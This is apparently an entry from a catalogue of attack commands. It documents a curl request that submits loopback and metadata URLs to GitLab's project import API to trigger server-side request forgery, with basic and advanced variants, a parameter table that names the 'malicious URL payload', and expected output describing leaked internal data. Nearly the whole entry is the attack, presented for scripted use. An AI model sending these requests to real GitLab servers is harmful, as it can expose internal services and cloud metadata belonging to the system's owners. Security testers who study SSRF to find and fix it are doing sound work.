---
data: >-
  curl -X POST 'https://gitlab.example.com/api/v4/projects/import' -H
  'Private-Token: your_token' -d 'url=http://localhost:8080/internal' -d
  'namespace_id=1'
tags:
  - ssrf
  - api
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.608Z'
id: f4349d9f-206e-4fa3-8362-50667f300063
verified: false
validated: true
submitted: true
---
# curl-send-import-request

## Command

```bash
curl -X POST 'https://gitlab.example.com/api/v4/projects/import' -H 'Private-Token: your_token' -d 'url=http://localhost:8080/internal' -d 'namespace_id=1'
```

## Description

This command simulates submitting a malicious URL to GitLab's project import API, triggering SSRF by forcing an internal request. Use it to test URL validation bypasses in automated or scripted attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `'https://gitlab.example.com/api/v4/projects/import'` | GitLab API endpoint for imports | Yes |
| `-H 'Private-Token: your_token'` | Authentication header with API token | Yes |
| `-d 'url=http://localhost:8080/internal'` | Malicious URL payload for SSRF | Yes |
| `-d 'namespace_id=1'` | Target namespace ID for the project | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://gitlab.example.com/api/v4/projects/import' -H 'Private-Token: token' -d 'url=http://localhost:8080'
```

### Advanced Usage

```bash
curl -X POST 'https://gitlab.example.com/api/v4/projects/import' -H 'Private-Token: token' -d 'url=http://127.0.0.1:9000/metadata' -d 'namespace_id=1' -v
```

## Expected Output

Successful response includes a 201 Created status with import job details; errors may leak internal service responses if SSRF succeeds, e.g., JSON with internal data or HTTP status from localhost.

## Related

- [[Related Procedure]]
